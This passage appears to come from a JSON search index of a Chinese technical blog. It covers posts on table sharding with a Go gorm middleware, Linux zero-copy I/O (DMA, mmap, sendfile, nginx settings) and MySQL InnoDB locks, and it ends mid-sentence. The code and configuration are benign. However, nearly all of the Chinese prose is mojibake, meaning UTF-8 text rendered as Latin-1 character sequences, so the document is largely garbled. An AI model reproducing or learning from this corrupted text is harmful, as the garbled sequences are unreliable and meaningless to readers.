åˆ†è¡¨æ¦‚å¿µ\n\nå•è¡¨è¡Œæ•°è¶…è¿‡ 500 ä¸‡è¡Œæˆ–è€…å•è¡¨å®¹é‡è¶…è¿‡ 2GBï¼Œæ‰æ¨èè¿›è¡Œåˆ†åº“åˆ†è¡¨ã€‚\n\n<!-- more -->\n\n### 1.1 åˆ†è¡¨ç®—æ³•\n\né€‰å®šäº†åˆ†è¡¨å­—æ®µä¹‹åï¼Œå¦‚ä½•åŸºäºè¿™ä¸ªåˆ†è¡¨å­—æ®µæ¥å‡†ç¡®çš„æŠŠæ•°æ®åˆ†è¡¨åˆ°æŸä¸€å¼ è¡¨ä¸­å‘¢?\n\nè¿™å°±æ˜¯åˆ†è¡¨ç®—æ³•è¦åšçš„äº‹æƒ…äº†ï¼Œä½†æ˜¯ä¸ç®¡ä»€ä¹ˆç®—æ³•ï¼Œæˆ‘ä»¬éƒ½éœ€è¦ç¡®ä¿ä¸€ä¸ªå‰æï¼Œé‚£å°±æ˜¯åŒä¸€ä¸ªåˆ†è¡¨å­—æ®µï¼Œç»è¿‡è¿™ä¸ªç®—æ³•å¤„ç†åï¼Œå¾—åˆ°çš„ç»“æœä¸€å®šæ˜¯ä¸€è‡´çš„ï¼Œä¸å¯å˜çš„ã€‚\n\né€šå¸¸æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬å¯¹ order è¡¨è¿›è¡Œåˆ†è¡¨çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦åˆ†æˆ 128 å¼ è¡¨çš„è¯ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ 128 è¡¨åº”è¯¥æ˜¯:order_0000ã€order_0001ã€order_0002.....order_0126ã€order_0127\n\n# 2. Gorm åˆ†è¡¨ä¸­é—´ä»¶\n\nå‚è€ƒæˆ‘çš„ä»“åº“ï¼š (<https://github.com/unix2dos/sharding>)\n\nåœ¨gormåˆ†è¡¨ä¸­é—´ä»¶çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹äº†ä»¥ä¸‹é—®é¢˜ã€‚\n\n- ä¿®æ”¹äº† DoubleWrite å¼€å¯åï¼ŒæŸ¥è¯¢ä¹Ÿæ˜¯åŒæŸ¥çš„é—®é¢˜ã€‚(<https://github.com/go-gorm/sharding/issues/115>ï¼‰\n- ä¿®æ”¹äº†åˆ†è¡¨æ’ä»¶ï¼Œä¸åŒè¡¨åªèƒ½æ”¯æŒåŒä¸€ä¸ªåˆ†è¡¨é…ç½®çš„é—®é¢˜ã€‚\n\n### 2.1 ä½¿ç”¨\n\n```go\nfunc main() {  \n    db, _ := gorm.Open()  \n  \n    tableConfigs := make(map[string]sharding.Config, 0)  \n    tableConfigs[\"table_a\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 128, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    tableConfigs[\"table_b\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 128, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    tableConfigs[\"table_c\"] = sharding.Config{ShardingKey: \"user_id\", NumberOfShards: 16, PrimaryKeyGenerator: sharding.PKSnowflake, DoubleWrite: true}  \n    _ = db.Use(sharding.RegisterTablesConfigs(tableConfigs))  \n}\n```\n\n# 3. å‚è€ƒèµ„æ–™\n\n- https://www.51cto.com/article/709614.html\n","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£","url":"%2Fp%2F6aa20615.html","content":"\nç£ç›˜å¯ä»¥è¯´æ˜¯è®¡ç®—æœºç³»ç»Ÿæœ€æ…¢çš„ç¡¬ä»¶ä¹‹ä¸€ï¼Œè¯»å†™é€Ÿåº¦ç›¸å·®å†…å­˜ 10 å€ä»¥ä¸Šï¼Œæ‰€ä»¥é’ˆå¯¹ä¼˜åŒ–ç£ç›˜çš„æŠ€æœ¯éå¸¸çš„å¤šï¼Œæ¯”å¦‚é›¶æ‹·è´ã€ç›´æ¥ I/Oã€å¼‚æ­¥ I/O ç­‰ç­‰ï¼Œè¿™äº›ä¼˜åŒ–çš„ç›®çš„å°±æ˜¯ä¸ºäº†æé«˜ç³»ç»Ÿçš„ååé‡ï¼Œå¦å¤–æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„ç£ç›˜é«˜é€Ÿç¼“å­˜åŒºï¼Œå¯ä»¥æœ‰æ•ˆçš„å‡å°‘ç£ç›˜çš„è®¿é—®æ¬¡æ•°ã€‚\n\n<!-- more -->\n\n# 1. DMA\n\n### 1.1 DMAå‰ï¼ˆCPUå‚ä¸æ¬è¿æ•°æ®ï¼‰\n\nåœ¨æ²¡æœ‰ DMA æŠ€æœ¯å‰ï¼ŒI/O çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š\n\n- CPU å‘å‡ºå¯¹åº”çš„æŒ‡ä»¤ç»™ç£ç›˜æ§åˆ¶å™¨ï¼Œç„¶åè¿”å›ï¼›\n- ç£ç›˜æ§åˆ¶å™¨æ”¶åˆ°æŒ‡ä»¤åï¼Œäºæ˜¯å°±å¼€å§‹å‡†å¤‡æ•°æ®ï¼Œä¼šæŠŠæ•°æ®æ”¾å…¥åˆ°ç£ç›˜æ§åˆ¶å™¨çš„å†…éƒ¨ç¼“å†²åŒºä¸­ï¼Œç„¶åäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼›\n- CPU æ”¶åˆ°ä¸­æ–­ä¿¡å·åï¼Œåœä¸‹æ‰‹å¤´çš„å·¥ä½œï¼Œæ¥ç€æŠŠç£ç›˜æ§åˆ¶å™¨çš„ç¼“å†²åŒºçš„æ•°æ®ä¸€æ¬¡ä¸€ä¸ªå­—èŠ‚åœ°è¯»è¿›è‡ªå·±çš„å¯„å­˜å™¨ï¼Œç„¶åå†æŠŠå¯„å­˜å™¨é‡Œçš„æ•°æ®å†™å…¥åˆ°å†…å­˜ï¼Œè€Œåœ¨æ•°æ®ä¼ è¾“çš„æœŸé—´ CPU æ˜¯æ— æ³•æ‰§è¡Œå…¶ä»–ä»»åŠ¡çš„ã€‚\n\n<img src=\"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£/I_Oä¸­æ–­.png\" alt=\"img\" style=\"zoom:50%;\" />\n\næ•´ä¸ªæ•°æ®çš„ä¼ è¾“è¿‡ç¨‹ï¼Œéƒ½è¦éœ€è¦ CPU äº²è‡ªå‚ä¸æ¬è¿æ•°æ®çš„è¿‡ç¨‹ï¼Œè€Œä¸”è¿™ä¸ªè¿‡ç¨‹ï¼ŒCPU æ˜¯ä¸èƒ½åšå…¶ä»–äº‹æƒ…çš„ã€‚è®¡ç®—æœºç§‘å­¦å®¶ä»¬å‘ç°äº†äº‹æƒ…çš„ä¸¥é‡æ€§åï¼Œäºæ˜¯å°±å‘æ˜äº† DMA æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥å†…å­˜è®¿é—®ï¼ˆDirect Memory Accessï¼‰ æŠ€æœ¯ã€‚\n\n### 1.2 å¼•å…¥DMAï¼ˆå‡å°‘CPUæ¬è¿ï¼‰\n\nåœ¨è¿›è¡Œ I/O è®¾å¤‡å’Œå†…å­˜çš„æ•°æ®ä¼ è¾“çš„æ—¶å€™ï¼Œæ•°æ®æ¬è¿çš„å·¥ä½œå…¨éƒ¨äº¤ç»™ DMA æ§åˆ¶å™¨ï¼Œè€Œ CPU ä¸å†å‚ä¸ä»»ä½•ä¸æ•°æ®æ¬è¿ç›¸å…³çš„äº‹æƒ…ï¼Œè¿™æ · CPU å°±å¯ä»¥å»å¤„ç†åˆ«çš„äº‹åŠ¡ã€‚\n\n<img src=\"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£/DRM_I_O è¿‡ç¨‹.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nå…·ä½“è¿‡ç¨‹ï¼š\n\n- ç”¨æˆ·è¿›ç¨‹è°ƒç”¨ read æ–¹æ³•ï¼Œå‘æ“ä½œç³»ç»Ÿå‘å‡º I/O è¯·æ±‚ï¼Œè¯·æ±‚è¯»å–æ•°æ®åˆ°è‡ªå·±çš„å†…å­˜ç¼“å†²åŒºä¸­ï¼Œè¿›ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼›\n- æ“ä½œç³»ç»Ÿæ”¶åˆ°è¯·æ±‚åï¼Œè¿›ä¸€æ­¥å°† I/O è¯·æ±‚å‘é€ DMAï¼Œç„¶åè®© CPU æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼›\n- DMA è¿›ä¸€æ­¥å°† I/O è¯·æ±‚å‘é€ç»™ç£ç›˜ï¼›\n- ç£ç›˜æ”¶åˆ° DMA çš„ I/O è¯·æ±‚ï¼ŒæŠŠæ•°æ®ä»ç£ç›˜è¯»å–åˆ°ç£ç›˜æ§åˆ¶å™¨çš„ç¼“å†²åŒºä¸­ï¼Œå½“ç£ç›˜æ§åˆ¶å™¨çš„ç¼“å†²åŒºè¢«è¯»æ»¡åï¼Œå‘ DMA å‘èµ·ä¸­æ–­ä¿¡å·ï¼Œå‘ŠçŸ¥è‡ªå·±ç¼“å†²åŒºå·²æ»¡ï¼›\n- DMA æ”¶åˆ°ç£ç›˜çš„ä¿¡å·ï¼Œå°†ç£ç›˜æ§åˆ¶å™¨ç¼“å†²åŒºä¸­çš„æ•°æ®æ‹·è´åˆ°å†…æ ¸ç¼“å†²åŒºä¸­ï¼Œæ­¤æ—¶ä¸å ç”¨ CPUï¼ŒCPU å¯ä»¥æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼›\n- å½“ DMA è¯»å–äº†è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œå°±ä¼šå‘é€ä¸­æ–­ä¿¡å·ç»™ CPUï¼›\n- CPU æ”¶åˆ° DMA çš„ä¿¡å·ï¼ŒçŸ¥é“æ•°æ®å·²ç»å‡†å¤‡å¥½ï¼Œäºæ˜¯å°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å›ï¼›\n\n### 1.3 ç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®æ‹·è´\n\nä»æœåŠ¡å™¨è·å–æ–‡ä»¶çš„ä»£ç é€šå¸¸å¦‚ä¸‹ï¼Œä¸€èˆ¬ä¼šéœ€è¦ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼š\n\n```c\nread(file, tmp_buf, len);\nwrite(socket, tmp_buf, len);\n```\n\n<img src=\"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£/ä¼ ç»Ÿæ–‡ä»¶ä¼ è¾“.png\" alt=\"img\" style=\"zoom:50%;\" />\n\né¦–å…ˆï¼ŒæœŸé—´å…±å‘ç”Ÿäº† 4 æ¬¡ç”¨æˆ·æ€ä¸å†…æ ¸æ€çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå› ä¸ºå‘ç”Ÿäº†ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€æ¬¡æ˜¯ `read()` ï¼Œä¸€æ¬¡æ˜¯ `write()`ï¼Œæ¯æ¬¡ç³»ç»Ÿè°ƒç”¨éƒ½å¾—å…ˆä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œç­‰å†…æ ¸å®Œæˆä»»åŠ¡åï¼Œå†ä»å†…æ ¸æ€åˆ‡æ¢å›ç”¨æˆ·æ€ã€‚\n\næˆ‘ä»¬çœ‹è¿™ä¸ªæ–‡ä»¶ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬åªæ˜¯æ¬è¿ä¸€ä»½æ•°æ®ï¼Œç»“æœå´æ¬è¿äº† 4 æ¬¡ï¼Œè¿‡å¤šçš„æ•°æ®æ‹·è´æ— ç–‘ä¼šæ¶ˆè€— CPU èµ„æºï¼Œå¤§å¤§é™ä½äº†ç³»ç»Ÿæ€§èƒ½ã€‚\n\næ‰€ä»¥ï¼Œ**è¦æƒ³æé«˜æ–‡ä»¶ä¼ è¾“çš„æ€§èƒ½ï¼Œå°±éœ€è¦å‡å°‘ã€Œç”¨æˆ·æ€ä¸å†…æ ¸æ€çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€å’Œã€Œå†…å­˜æ‹·è´ã€çš„æ¬¡æ•°**ã€‚\n\n# 2. é›¶æ‹·è´\n\né›¶æ‹·è´æŠ€æœ¯å®ç°çš„æ–¹å¼é€šå¸¸æœ‰ 2 ç§ï¼šmmap + write  å’Œ sendfileã€‚\n\n### 2.1 mmap å writeï¼ˆæ˜ å°„å°‘äº†ä¸€æ¬¡cpuæ‹·è´ï¼‰\n\nåœ¨å‰é¢æˆ‘ä»¬çŸ¥é“ï¼Œ`read()` ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­ä¼šæŠŠå†…æ ¸ç¼“å†²åŒºçš„æ•°æ®æ‹·è´åˆ°ç”¨æˆ·çš„ç¼“å†²åŒºé‡Œï¼Œäºæ˜¯ä¸ºäº†å‡å°‘è¿™ä¸€æ­¥å¼€é”€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ `mmap()` æ›¿æ¢ `read()` ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚\n\n```c\nbuf = mmap(file, len);\nwrite(sockfd, buf, len);\n```\n\n`mmap()` ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¼šç›´æ¥æŠŠå†…æ ¸ç¼“å†²åŒºé‡Œçš„æ•°æ®ã€Œæ˜ å°„ã€åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè¿™æ ·ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ä¸ç”¨æˆ·ç©ºé—´å°±ä¸éœ€è¦å†è¿›è¡Œä»»ä½•çš„æ•°æ®æ‹·è´æ“ä½œã€‚\n\n<img src=\"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£/mmap_writeé›¶æ‹·è´.png\" alt=\"mmap + write é›¶æ‹·è´\" style=\"zoom: 60%;\" />\n\nå…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- åº”ç”¨è¿›ç¨‹è°ƒç”¨äº† `mmap()` åï¼ŒDMA ä¼šæŠŠç£ç›˜çš„æ•°æ®æ‹·è´åˆ°å†…æ ¸çš„ç¼“å†²åŒºé‡Œã€‚æ¥ç€ï¼Œåº”ç”¨è¿›ç¨‹è·Ÿæ“ä½œç³»ç»Ÿå†…æ ¸ã€Œå…±äº«ã€è¿™ä¸ªç¼“å†²åŒºï¼›\n- åº”ç”¨è¿›ç¨‹å†è°ƒç”¨ `write()`ï¼Œæ“ä½œç³»ç»Ÿç›´æ¥å°†å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®æ‹·è´åˆ° socket ç¼“å†²åŒºä¸­ï¼Œè¿™ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨å†…æ ¸æ€ï¼Œç”± CPU æ¥æ¬è¿æ•°æ®ï¼›\n- æœ€åï¼ŒæŠŠå†…æ ¸çš„ socket ç¼“å†²åŒºé‡Œçš„æ•°æ®ï¼Œæ‹·è´åˆ°ç½‘å¡çš„ç¼“å†²åŒºé‡Œï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ç”± DMA æ¬è¿çš„ã€‚\n\næˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œé€šè¿‡ä½¿ç”¨ `mmap()` æ¥ä»£æ›¿ `read()`ï¼Œ å¯ä»¥å‡å°‘ä¸€æ¬¡æ•°æ®æ‹·è´çš„è¿‡ç¨‹ã€‚\n\nä½†è¿™è¿˜ä¸æ˜¯æœ€ç†æƒ³çš„é›¶æ‹·è´ï¼Œå› ä¸ºä»ç„¶éœ€è¦é€šè¿‡ CPU æŠŠå†…æ ¸ç¼“å†²åŒºçš„æ•°æ®æ‹·è´åˆ° socket ç¼“å†²åŒºé‡Œï¼Œè€Œä¸”ä»ç„¶éœ€è¦ 4 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨è¿˜æ˜¯ 2 æ¬¡ã€‚\n\n### 2.2 sendfile ï¼ˆå†…æ ¸ç¼“å­˜ç›´æ¥åˆ°ç½‘å¡ï¼‰\n\nåœ¨ Linux å†…æ ¸ç‰ˆæœ¬ 2.1 ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªä¸“é—¨å‘é€æ–‡ä»¶çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•° `sendfile()`ï¼Œå‡½æ•°å½¢å¼å¦‚ä¸‹ï¼š\n\n```c\n#include <sys/socket.h>\nssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);\n```\n\né¦–å…ˆï¼Œå®ƒå¯ä»¥æ›¿ä»£å‰é¢çš„ `read()` å’Œ `write()` è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±å‡å°‘äº† 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ã€‚\n\nä» Linux å†…æ ¸ `2.4` ç‰ˆæœ¬å¼€å§‹èµ·ï¼Œå¯¹äºæ”¯æŒç½‘å¡æ”¯æŒ SG-DMA æŠ€æœ¯çš„æƒ…å†µä¸‹ï¼Œ `sendfile()` ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹å‘ç”Ÿäº†ç‚¹å˜åŒ–ï¼Œå…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼šè¿™ä¸ªè¿‡ç¨‹ä¹‹ä¸­ï¼Œåªè¿›è¡Œäº† 2 æ¬¡æ•°æ®æ‹·è´ã€‚\n\n- ç¬¬ä¸€æ­¥ï¼Œé€šè¿‡ DMA å°†ç£ç›˜ä¸Šçš„æ•°æ®æ‹·è´åˆ°å†…æ ¸ç¼“å†²åŒºé‡Œï¼›\n- ç¬¬äºŒæ­¥ï¼Œç¼“å†²åŒºæè¿°ç¬¦å’Œæ•°æ®é•¿åº¦ä¼ åˆ° socket ç¼“å†²åŒºï¼Œè¿™æ ·ç½‘å¡çš„ SG-DMA æ§åˆ¶å™¨å°±å¯ä»¥ç›´æ¥å°†å†…æ ¸ç¼“å­˜ä¸­çš„æ•°æ®æ‹·è´åˆ°ç½‘å¡çš„ç¼“å†²åŒºé‡Œï¼Œæ­¤è¿‡ç¨‹ä¸éœ€è¦å°†æ•°æ®ä»æ“ä½œç³»ç»Ÿå†…æ ¸ç¼“å†²åŒºæ‹·è´åˆ° socket ç¼“å†²åŒºä¸­ï¼Œè¿™æ ·å°±å‡å°‘äº†ä¸€æ¬¡æ•°æ®æ‹·è´ï¼›\n\n\n\n<img src=\"linuxé›¶æ‹·è´æŠ€æœ¯è®²è§£/senfile-é›¶æ‹·è´.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™å°±æ˜¯æ‰€è°“çš„é›¶æ‹·è´ï¼ˆZero-copyï¼‰æŠ€æœ¯ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰åœ¨å†…å­˜å±‚é¢å»æ‹·è´æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å…¨ç¨‹æ²¡æœ‰é€šè¿‡ CPU æ¥æ¬è¿æ•°æ®ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯é€šè¿‡ DMA æ¥è¿›è¡Œä¼ è¾“çš„ã€‚\n\né›¶æ‹·è´æŠ€æœ¯çš„æ–‡ä»¶ä¼ è¾“æ–¹å¼ç›¸æ¯”ä¼ ç»Ÿæ–‡ä»¶ä¼ è¾“çš„æ–¹å¼ï¼Œå‡å°‘äº† 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œæ•°æ®æ‹·è´æ¬¡æ•°ï¼Œåªéœ€è¦ 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œæ•°æ®æ‹·è´æ¬¡æ•°ï¼Œå°±å¯ä»¥å®Œæˆæ–‡ä»¶çš„ä¼ è¾“ï¼Œè€Œä¸” 2 æ¬¡çš„æ•°æ®æ‹·è´è¿‡ç¨‹ï¼Œéƒ½ä¸éœ€è¦é€šè¿‡ CPUï¼Œ2 æ¬¡éƒ½æ˜¯ç”± DMA æ¥æ¬è¿ã€‚\n\næ‰€ä»¥ï¼Œæ€»ä½“æ¥çœ‹ï¼Œé›¶æ‹·è´æŠ€æœ¯å¯ä»¥æŠŠæ–‡ä»¶ä¼ è¾“çš„æ€§èƒ½æé«˜è‡³å°‘ä¸€å€ä»¥ä¸Šã€‚\n\n# 3. å¤´è„‘é£æš´\n\n### 3.1 ä½¿ç”¨é›¶æ‹·è´æŠ€æœ¯çš„é¡¹ç›®\n\näº‹å®ä¸Šï¼ŒKafka è¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œå°±åˆ©ç”¨äº†ã€Œé›¶æ‹·è´ã€æŠ€æœ¯ï¼Œä»è€Œå¤§å¹…æå‡äº† I/O çš„ååç‡ï¼Œè¿™ä¹Ÿæ˜¯ Kafka åœ¨å¤„ç†æµ·é‡æ•°æ®ä¸ºä»€ä¹ˆè¿™ä¹ˆå¿«çš„åŸå› ä¹‹ä¸€ã€‚\n\nå¦‚æœä½ è¿½æº¯ Kafka æ–‡ä»¶ä¼ è¾“çš„ä»£ç ï¼Œä½ ä¼šå‘ç°ï¼Œæœ€ç»ˆå®ƒè°ƒç”¨äº† Java NIO åº“é‡Œçš„ `transferTo` æ–¹æ³•ï¼Œå¦‚æœ Linux ç³»ç»Ÿæ”¯æŒ `sendfile()` ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆ `transferTo()` å®é™…ä¸Šæœ€åå°±ä¼šä½¿ç”¨åˆ° `sendfile()` ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚\n\nå¦å¤–ï¼ŒNginx ä¹Ÿæ”¯æŒé›¶æ‹·è´æŠ€æœ¯ï¼Œä¸€èˆ¬é»˜è®¤æ˜¯å¼€å¯é›¶æ‹·è´æŠ€æœ¯ï¼Œè¿™æ ·æœ‰åˆ©äºæé«˜æ–‡ä»¶ä¼ è¾“çš„æ•ˆç‡ï¼Œæ˜¯å¦å¼€å¯é›¶æ‹·è´æŠ€æœ¯çš„é…ç½®å¦‚ä¸‹ï¼š\n\n```bash\nhttp {\n...\n    sendfile on\n...\n}\n```\n\nsendfile é…ç½®çš„å…·ä½“æ„æ€:\n\n- è®¾ç½®ä¸º on è¡¨ç¤ºï¼Œä½¿ç”¨é›¶æ‹·è´æŠ€æœ¯æ¥ä¼ è¾“æ–‡ä»¶ï¼šsendfile ï¼Œè¿™æ ·åªéœ€è¦ 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå’Œ 2 æ¬¡æ•°æ®æ‹·è´ã€‚\n- è®¾ç½®ä¸º off è¡¨ç¤ºï¼Œä½¿ç”¨ä¼ ç»Ÿçš„æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ï¼šread + writeï¼Œè¿™æ—¶å°±éœ€è¦ 4 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå’Œ 4 æ¬¡æ•°æ®æ‹·è´ã€‚\n\n### 3.2 ä¼ è¾“å¤§æ–‡ä»¶ä¸è¦é›¶æ‹·è´\n\nä¼ è¾“å¤§æ–‡ä»¶çš„æ—¶å€™ï¼Œç”±äºå¤§æ–‡ä»¶éš¾ä»¥å‘½ä¸­ PageCache ç¼“å­˜ï¼Œè€Œä¸”ä¼šå æ»¡ PageCache å¯¼è‡´ã€Œçƒ­ç‚¹ã€æ–‡ä»¶æ— æ³•å……åˆ†åˆ©ç”¨ç¼“å­˜ï¼Œä»è€Œå¢å¤§äº†æ€§èƒ½å¼€é”€ï¼Œå› æ­¤ï¼Œè¿™æ—¶åº”è¯¥ä½¿ç”¨ç›´æ¥ I/Oã€‚\n\næ‰€ä»¥ï¼Œä¼ è¾“æ–‡ä»¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦æ ¹æ®æ–‡ä»¶çš„å¤§å°æ¥ä½¿ç”¨ä¸åŒçš„æ–¹å¼ï¼š\n\n- ä¼ è¾“å¤§æ–‡ä»¶çš„æ—¶å€™ï¼Œä½¿ç”¨ã€Œå¼‚æ­¥ I/O + ç›´æ¥ I/Oã€ï¼›\n- ä¼ è¾“å°æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ™ä½¿ç”¨ã€Œé›¶æ‹·è´æŠ€æœ¯ã€ï¼›\n\nåœ¨ nginx ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹é…ç½®ï¼Œæ¥æ ¹æ®æ–‡ä»¶çš„å¤§å°æ¥ä½¿ç”¨ä¸åŒçš„æ–¹å¼ï¼š\n\n```js\nlocation /video/ { \n    sendfile on; \n    aio on; \n    directio 1024m; \n}\n```\n\nå½“æ–‡ä»¶å¤§å°å¤§äº `directio` å€¼åï¼Œä½¿ç”¨ã€Œå¼‚æ­¥ I/O + ç›´æ¥ I/Oã€ï¼Œå¦åˆ™ä½¿ç”¨ã€Œé›¶æ‹·è´æŠ€æœ¯ã€ã€‚\n\n\n\n### 3.3 æ€»ç»“\n\n- æ²¡æœ‰é›¶æ‹·è´ä¼šå‘ç”Ÿ 4 æ¬¡æ‹·è´ã€‚DMA ä»ç£ç›˜åˆ°å†…æ ¸ç¼“å­˜ï¼Œå†…æ ¸åˆ°ç”¨æˆ·ç¼“å­˜ï¼Œç”¨æˆ·ç¼“å­˜åˆ° Socket ç¼“å­˜ï¼ŒSocket ç¼“å­˜åˆ°ç½‘å¡ã€‚\n- mmapï¼ˆå†…æ ¸ç¼“å­˜å’Œç”¨æˆ·ç¼“å­˜æ˜ å°„ï¼‰+writeï¼Œå‡å°‘ä¸€æ¬¡ cpu æ‹·è´ã€‚\n- sendfile ç»™ socket å‘é€æè¿°ç¬¦å’Œé•¿åº¦ï¼Œå†…æ ¸ç¼“å­˜ç›´æ¥åˆ°ç½‘å¡ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.xiaolincoding.com/os/8_network_system/zero_copy.html\n","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"mysqlçš„é”å’Œäº‹åŠ¡æœºåˆ¶","url":"%2Fp%2F9762ea3e.html","content":"\n# 1. mysqlçš„é”\n\n### 1.1 ä¸åŒæ•°æ®åº“çš„é”å®ç°\n\nå¯¹äºMyISAMå¼•æ“ï¼Œå…¶é”æ˜¯è¡¨é”è®¾è®¡ã€‚å¹¶å‘æƒ…å†µä¸‹çš„è¯»æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¹¶å‘æ’å…¥æ—¶çš„æ€§èƒ½å°±è¦å·®ä¸€äº›äº†ã€‚Microsoft SQL Serverå¼€å§‹æ”¯æŒä¹è§‚å¹¶å‘å’Œæ‚²è§‚å¹¶å‘ï¼Œåœ¨ä¹è§‚å¹¶å‘ä¸‹å¼€å§‹æ”¯æŒè¡Œçº§é”ï¼Œä½†æ˜¯å…¶å®ç°æ–¹å¼ä¸InnoDBå­˜å‚¨å¼•æ“çš„å®ç°æ–¹å¼å®Œå…¨ä¸åŒã€‚ç”¨æˆ·ä¼šå‘ç°åœ¨Microsoft SQL Serverä¸‹ï¼Œé”æ˜¯ä¸€ç§ç¨€æœ‰çš„èµ„æºï¼Œé”è¶Šå¤šå¼€é”€å°±è¶Šå¤§ï¼Œå› æ­¤å®ƒä¼šæœ‰é”å‡çº§ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¡Œé”ä¼šå‡çº§åˆ°è¡¨é”ï¼Œè¿™æ—¶å¹¶å‘çš„æ€§èƒ½åˆå›åˆ°äº†ä»¥å‰ã€‚\n\n<!-- more -->\n\n### 1.2 è¡Œé”\n\nInnoDB å­˜å‚¨å¼•æ“å®ç°äº†å¦‚ä¸‹ä¸¤ç§æ ‡å‡†çš„è¡Œçº§é”ï¼š\n\n+ å…±äº«é”ï¼ˆS Lockï¼‰ï¼Œå…è®¸äº‹åŠ¡è¯»ä¸€è¡Œæ•°æ®ã€‚\n\n+ æ’ä»–é”ï¼ˆX Lockï¼‰ï¼Œå…è®¸äº‹åŠ¡åˆ é™¤æˆ–æ›´æ–°ä¸€è¡Œæ•°æ®ã€‚\n\nå¦‚æœä¸€ä¸ªäº‹åŠ¡T1å·²ç»è·å¾—äº†è¡Œrçš„å…±äº«é”ï¼Œé‚£ä¹ˆå¦å¤–çš„äº‹åŠ¡T2å¯ä»¥ç«‹å³è·å¾—è¡Œrçš„å…±äº«é”ï¼Œå› ä¸ºè¯»å–å¹¶æ²¡æœ‰æ”¹å˜è¡Œrçš„æ•°æ®ï¼Œç§°è¿™ç§æƒ…å†µä¸ºé”å…¼å®¹ï¼ˆLock Compatibleï¼‰ã€‚ä½†è‹¥æœ‰å…¶ä»–çš„äº‹åŠ¡T3æƒ³è·å¾—è¡Œrçš„æ’ä»–é”ï¼Œåˆ™å…¶å¿…é¡»ç­‰å¾…äº‹åŠ¡T1ã€T2é‡Šæ”¾è¡Œrä¸Šçš„å…±äº«é”â€”â€”è¿™ç§æƒ…å†µç§°ä¸ºé”ä¸å…¼å®¹ã€‚\n\nX é”ä¸ä»»ä½•çš„é”éƒ½ä¸å…¼å®¹ï¼Œè€Œ S é”ä»…å’Œ S 